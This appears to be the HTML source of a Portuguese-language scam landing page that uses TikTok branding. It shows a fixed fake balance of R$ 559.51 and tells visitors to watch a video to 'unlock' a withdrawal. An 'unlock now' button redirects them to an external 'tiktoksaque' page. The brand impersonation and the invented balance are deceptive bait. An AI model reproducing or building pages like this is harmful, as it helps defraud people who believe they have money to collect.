<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Programa Inter - VSL</title>
    <link rel="icon" href="images/Logo%20TTK.png" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background-color: #FFFFFF;
            color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Cabeçalho */
        .header {
            width: 100%;
            background-color: #ff0150;
            color: white;
            font-weight: bold;
            text-align: center;
            padding: 10px;
            font-size: 16px;
        }

        /* Container Principal */
        #p1 {
            width: 100%;
            max-width: 400px;
            background-color: #FFFFFF;
            padding: 15px;
            border-bottom: 1px solid #202020;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        #logo {
            width: 130px;
            margin-left: 5px;
        }

        .boxSaldo {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            border: 2px solid #ff0150;
            border-radius: 6px;
            padding: 5px 10px;
            margin-right: 5px;
        }

        .textoSaldo {
            font-size: 12px;
            font-weight: bold;
            background: #fff;
            padding: 2px 5px;
            color: #333;
        }

        .valorSaldo {
            font-size: 16px;
            font-weight: 700;
            color: #333;
        }

        /* Conteúdo do Vídeo */
        #produto1 {
            width: 100%;
            max-width: 400px;
            text-align: center;
            padding: 15px;
        }

        #produto1 h4 {
            color: #ff0150;
            font-size: 18px;
            margin-bottom: 10px;
        }

        #video-container {
            width: 100%;
            max-width: 400px;
            height: auto;
            aspect-ratio: 16/9;
            margin: 0 auto;
            margin-bottom: 20px;
            overflow: hidden;
            border: 2px solid #ff0150;
            border-radius: 8px;
        }

        #video-container iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* Botão */
        .centralizar {
            width: 100%;
            display: flex;
            justify-content: center;
        }

        button {
            background-color: #ff0150;
            color: white;
            border: none;
            border-radius: 5px;
            width: 85%;
            max-width: 300px;
            height: 50px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #e66a00;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Define o valor inicial do saldo
            const saldoAtualizado = document.querySelector(".saldoAtualizado");
            if (saldoAtualizado) {
                saldoAtualizado.textContent = "559.51"; // Valor do saldo inicial
            }
        });

        function redirecionarSaldo() {
            // Redireciona para a página de saque
            const url = "https://novidadesdigital.pages.dev/tiktoksaque/";
            window.location.href = url;
        }
    </script>
</head>

<body>
    <div class="header">
        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
    </div>

    <div id="p1">
        <img id="logo" src="images/tiktoklogo.svg" alt="TikTok Logo">
        <div class="boxSaldo">
            <span class="textoSaldo">SALDO</span>
            <span class="valorSaldo">R$ <span class="saldoAtualizado">559.51</span></span>
        </div>
    </div>

    <div id="produto1">
        <h4>DESBLOQUEIO DE SALDO</h4>
        <p>Veja como liberar seu saque assistindo ao vídeo.</p>

        <div id="video-container">
            <iframe 
                src="https://player.vimeo.com/video/1047987546" 
                frameborder="0" 
                allow="autoplay; fullscreen" 
                allowfullscreen>
            </iframe>
        </div>

        <div class="centralizar">
            <button onclick="redirecionarSaldo()">DESBLOQUEAR AGORA</button>
        </div>
    </div>
</body>

</html>
